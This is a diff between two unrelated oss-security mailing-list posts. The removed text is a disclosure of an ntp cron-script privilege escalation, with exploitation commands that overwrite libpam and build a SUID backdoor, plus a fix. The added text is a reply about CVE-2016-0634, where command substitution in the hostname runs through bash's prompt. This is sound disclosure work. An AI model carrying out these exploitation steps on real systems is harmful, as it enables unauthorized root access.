@@ -1,189 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/21/7
-Message-ID: <22281686-34db-16c3-7ce2-a21b845d130c@halfdog.net>
-Date: Thu, 21 Jan 2016 19:04:22 +0000
-From: halfdog <me@...fdog.net>
-To: oss-security@...ts.openwall.com
-Subject: ntp.org stats data logrotation script privilege escalation
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/19/7
+Message-ID: <20160919183201.GA29516@hunt>
+Date: Mon, 19 Sep 2016 11:32:01 -0700
+From: Seth Arnold <seth.arnold@...onical.com>
+To: John Haxby <john.haxby@...cle.com>
+Cc: oss-security@...ts.openwall.com, Jan Schaumann <jschauma@...meister.org>, "chet.ramey" <chet.ramey@...e.edu>
+Subject: Re: CVE-2016-0634 -- bash prompt expanding $HOSTNAME
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+On Sun, Sep 18, 2016 at 08:06:57PM +0100, John Haxby wrote:
+> >>> A little while ago, one of our users discovered that by setting the
+> >>> hostname to $(something unpleasant), bash would run "something
+> >>> unpleasant" when it expanded \h in the prompt string.
+> > 
+> > This issue has been public since October, 2015 in Ubuntu's bug tracking
+> > system.
+> > 
+> 
+> Yes, the message was more to let people know that CVE-2016-0634  had
+> been assigned for this issue.   Do you have a link to the Ubuntu issue
+> and a different CVE number?
 
-As disclosure was already requested, here ist the public writeup:
+Hello John; we did not assign a CVE number for this issue.
 
-Introduction:
-=============
+Bernd Dietzel reported it at:
+https://bugs.launchpad.net/ubuntu/+source/bash/+bug/1507025
 
-The cronjob script bundled with ntp package is intended to perform
-cleanup on statistics files produced by NTP daemon running with
-statistics enabled. The script is run as root during the daily cronjobs
-all operations on the ntp-user controlled statistics directory without
-switching to user ntp. Thus all steps are performed with root
-permissions in place.
+Thanks
 
-Due to multiple bugs in the script, a malicious ntp user can make the
-backup process to overwrite arbitrary files with content controlled by
-the attacker, thus gaining root privileges. The problematic parts in
-/etc/cron.daily/ntp are:
-
-find "$statsdir" -type f -mtime +7 -exec rm {} \;
-
-# compress whatever is left to save space
-cd "$statsdir"
-ls *stats.???????? > /dev/null 2>&1
-if [ $? -eq 0 ]; then
-# Note that gzip won't compress the file names that
-# are hard links to the live/current files, so this
-# compresses yesterday and previous, leaving the live
-# log alone. We supress the warnings gzip issues
-# about not compressing the linked file.
-gzip --best --quiet *stats.????????
-
-Relevant targets are:
-
-* find and rm invocation is racy, symlinks on rm
-* rm can be invoked with one attacker controlled option
-* ls can be invoked with arbitrary number of attacker controlled command
-line options
-* gzip can be invoked with arbitrary number of attacker controlled options
-
-
-Exploitation:
-=============
-
-A sucessful attack should not be mitigated by symlink security
-restrictions. Thus the general POSIX/Linux design weakness of missing
-flags/syscalls for safe opening of path without the setfsuid workaround
-has to be targeted. See FilesystemRecursionAndSymlinks on that.
-Demonstration:
-
-First step is to pass the ls check in the script to trigger gzip, which
-is more suitable to perform file system changes than ls for executing
-arbitrary code. As this requires passing command line options to gzip
-which are not valid for ls, content of statsdir has to be modified
-exactly in between. This can be easily accomplished by preparing
-suitable entries in /var/lib/ntp and starting one instance of
-DirModifyInotify.c as user ntp:
-
-cd /var/lib/ntp
-mkdir astats.01234567 bstats.01234567
-# Copy away library, we will have to restore it afterwards. Without
-# that, login is disabled on console, via SSH, ...
-cp -a -- /lib/x86_64-linux-gnu/libpam.so.0.83.1 .
-gzip < /lib/x86_64-linux-gnu/libpam.so.0.83.1 >
-astats.01234567/libpam.so.0.83.1stats.01234567
-./DirModifyInotify --Watch bstats.01234567 --WatchCount 5 --MovePath
-bstats.01234567 --MoveTarget -drfSstats.01234567 &
-
-With just that in place, DirModifyInotify will react to the actions of
-ls, move the directory and thus trigger recursive decompression in gzip
-instead of plain compression. While gzip is running, the directory
-astats.01234567 has to replaced also to make it overwrite arbitrary
-files as user root. As gzip will attempt to restore uid/gid of
-compressed file to new uncompressed version, this will just change the
-ownership of PAM library to ntp user.
-
-./DirModifyInotify --Watch astats.01234567 --WatchCount 12 --MovePath
-astats.01234567 --MoveTarget disabled --LinkTarget /lib/x86_64-linux-gnu/
-
-After the daily cron jobs were run once, libpam.so.0.83.1 can be
-temporarily replaced, e.g. to create a SUID binary for escalation.
-
-gcc -Wall -fPIC -c LibPam.c
-ld -shared -Bdynamic LibPam.o -L/lib -lc -o libPam.so
-cat libPam.so > /lib/x86_64-linux-gnu/libpam.so.0.83.1
-gcc -o Backdoor SuidExec.c
-/bin/su
-# Back to normal
-./Backdoor /bin/sh -c 'cp --preserve=mode,timestamps -- libpam.so.0.83.1
-/lib/x86_64-linux-gnu/libpam.so.0.83.1; chown root.root
-/lib/x86_64-linux-gnu/libpam.so.0.83.1; exec /bin/sh'
-
-
-Mitigation:
-===========
-
-Following simple patch should fix all the issues.
-
-- --- /etc/cron.daily/ntp 2011-12-15 10:43:19.000000000 +0000
-+++ /etc/cron.daily/ntp 2015-12-16 09:28:32.057936904 +0000
-@@ -9,19 +9,23 @@
-statsdir=$(cat /etc/ntp.conf | grep -v '^#' | sed -n 's/statsdir \([^
-][^ ]*\)/\1/p')
-
-if [ -n "$statsdir" ] && [ -d "$statsdir" ]; then
-- - # only keep a week's depth of these
-- - find "$statsdir" -type f -mtime +7 -exec rm {} \;
-+ # only keep a week's depth of these. Delete only files exactly
-+ # within the directory and do not descend into subdirectories
-+ # to avoid security risks on platforms where find is not using
-+ # fts-library.
-+ find "$statsdir" -maxdepth 1 -type f -mtime +7 -delete
-
-- - # compress whatever is left to save space
-- - cd "$statsdir"
-- - ls *stats.???????? > /dev/null 2>&1
-+ # compress whatever is left to save space but make sure to really
-+ # do it only in the expected directory.
-+ cd "$statsdir" || exit 1
-+ ls -d -- *stats.???????? > /dev/null 2>&1
-if [ $? -eq 0 ]; then
-# Note that gzip won't compress the file names that
-# are hard links to the live/current files, so this
-# compresses yesterday and previous, leaving the live
-# log alone. We supress the warnings gzip issues
-# about not compressing the linked file.
-- - gzip --best --quiet *stats.????????
-+ gzip --best --quiet -- *stats.????????
-return=$?
-case $return in
-2)
-
-To protect against unidentified or future issues, the script should
-not be run with UID=0 at all. One variant for such a patch can be
-found at [0].
-
-
-Results, Discussion:
-====================
-
-The impact should be minor as
-
-* statsdir has to be enabled root-owned ntp configuration, which is not
-the default at least on Ubuntu Wily
-
-* NTP daemon has small attack surface, thus hard to gain access to ntp
-user for remote attacker
-
-* No SUID binaries to ease local users gaining ntp user rights
-
-
-Timeline:
-=========
-
-* 20151215: Discovery
-* 20151220: Report at Ubuntu Launchpad
-* 20151222: Checked also ntp.org Debian package, reported upstream
-* 20160121: Publication
-
-
-Material, References:
-=====================
-
-* [0] Article on the issue, references to all test tools mentioned in this
-post:
-http://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/
-* [1] Launchpad bug report:
-https://bugs.launchpad.net/ubuntu/+source/ntp/+bug/1528050
-
-- -- 
-http://www.halfdog.net/
-PGP: 156A AE98 B91F 0114 FE88 2BD8 C459 9386 feed a bee
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iEYEARECAAYFAlahK7AACgkQxFmThv7tq+7XHQCfRM6H6cditVs62LUJkO+251m+
-eUgAn2jGa9GCIElabfMVFfz7YlY/K+ep
-=opQj
------END PGP SIGNATURE-----
+Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
